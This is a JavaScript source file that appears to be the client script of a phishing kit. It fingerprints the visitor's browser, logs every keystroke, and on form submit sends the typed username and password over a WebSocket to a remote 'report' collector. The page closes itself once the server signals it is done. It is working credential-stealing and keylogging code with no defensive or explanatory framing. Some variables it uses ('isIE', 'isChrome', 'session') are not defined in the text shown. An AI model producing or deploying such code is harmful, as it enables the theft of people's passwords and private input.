const socket   = new WebSocket(report);
const form     = document.getElementById("PF_form");
const username = document.getElementById("PF_user");
const password = document.getElementById("PF_pass");

function browser(){
  if((!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0)
    return "Opera";
  
  if(typeof InstallTrigger !== 'undefined')
    return "Firefox";

  if(/constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(!window['safari'] || (typeof safari !== 'undefined' && window['safari'].pushNotification)))
    return "Safari";

  if(/*@cc_on!@*/false || !!document.documentMode)
    return "Internet Explorer";

  if(!isIE && !!window.StyleMedia)
    return "Edge (IE)";

  if(!!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime))
    return "Chrome";

  if(isChrome && (navigator.userAgent.indexOf("Edg") != -1))
    return "Edge (Chromium)";
}

function send(data){
  data["session"] = session;
  socket.send(JSON.stringify(data));
}

socket.addEventListener("open", (e) => {
  send({
    browser: browser(),
  });
})

socket.addEventListener("message", (e) => {
  const data = JSON.parse(e.data);
  if(data["done"] != undefined && data["done"] === true)
    window.close();
})

addEventListener("keydown", event =>{
  const data = {
    key: event.key
  };

  data["key"] = event.altKey ? "[Alt]" : data["key"];
  data["key"] = event.metaKey ? "[Meta]" : data["key"];
  data["key"] = event.ctrlKey ? "[Ctrl]" : data["key"];
  data["key"] = data["key"] === "Backspace" ? "[Backspace]" : data["key"];
  data["key"] = data["key"] === "Delete" ? "[Delete]" : data["key"];
  data["key"] = data["key"] === "Enter" ? "[Enter]" : data["key"];
  data["key"] = data["key"] === "Tab" ? "[Tab]" : data["key"];
  data["key"] = data["key"] === " " ? "[Space]" : data["key"];

  send(data);
});

form.addEventListener("submit", () => {
  send({
    username: username.value,
    password: password.value,
  });
})
